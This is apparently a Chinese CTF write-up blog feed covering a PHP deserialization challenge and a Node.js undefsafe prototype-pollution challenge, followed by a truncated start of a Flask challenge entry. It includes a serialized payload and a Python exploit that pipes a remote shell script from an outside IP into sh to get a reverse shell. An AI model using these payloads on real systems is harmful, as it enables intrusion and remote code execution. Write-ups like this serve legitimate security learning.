    <content type="html"><![CDATA[<p>比赛很自闭，开赛很久才放了web题，上了第一个PHP贼简单但还是做了蛮久，导致后面一道Java的不难的XXE没有时间做完，还好队友顶，crypto，RE，pwn师傅带飞，可以去线下划水了。</p><a id="more"></a><h2 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把op和filename属性改成public然后直接打</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"></span><br><span class="line">$a-&gt;op=<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">$a-&gt;filename=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="nodes"><a href="#nodes" class="headerlink" title="nodes"></a>nodes</h2><p>源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="built_in">this</span>.owner = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="built_in">this</span>.note_list[(<span class="built_in">this</span>.num++).toString()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>附件里有源码源码里有undefsafe直接Google出来一篇文章        </p><p><img src= "/img/loading.gif" data-lazy-src="1.png">      </p><p>得知这个包存在原型链污染的漏洞为了方便EXP直接弹shell了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a = &#123;<span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;xzl&#x27;</span>,<span class="string">&#x27;raw&#x27;</span>: <span class="string">&#x27;curl https://shell.now.sh/49.234.77.58:1337 | sh&#x27;</span>,<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;__proto__&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://8ceaa5d1d6594d5997a69b2cd58b7c9dc4c44671aed44506.cloudgame2.ichunqiu.com:8080/&quot;</span></span><br><span class="line">print(requests.post(url+<span class="string">&quot;edit_note&quot;</span>,json=a).text);</span><br><span class="line">print(requests.get(url+<span class="string">&quot;status&quot;</span>).text);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="2.png">            </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;比赛很自闭，开赛很久才放了web题，上了第一个PHP贼简单但还是做了蛮久，导致后面一道Java的不难的XXE没有时间做完，还好队友顶，crypto，RE，pwn师傅带飞，可以去线下划水了。&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
    <category term="NodeJS" scheme="http://yoursite.com/tags/NodeJS/"/>
    
    <category term="原型链污染" scheme="http://yoursite.com/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
    <category term="PHP反序列化" scheme="http://yoursite.com/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>刷题记录-DDCTF2019-homebrew event loop</title>
    <link href="http://yoursite.com/2020/05/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-DDCTF2019-homebrew-event-loop/"/>
    <id>http://yoursite.com/2020/05/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-DDCTF2019-homebrew-event-loop/</id>
    <published>2020-05-06T04:53:22.000Z</published>
    <updated>2020-05-06T05:51:11.119Z</updated>
    
    <content type="html"><![CDATA[<p>知识点：</p><ul><li><p>逻辑漏洞</p></li><li><p>flask session解密</p><a id="more"></a></li></ul><p>先放flask源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">&#x27;log&#x27;</span>]) 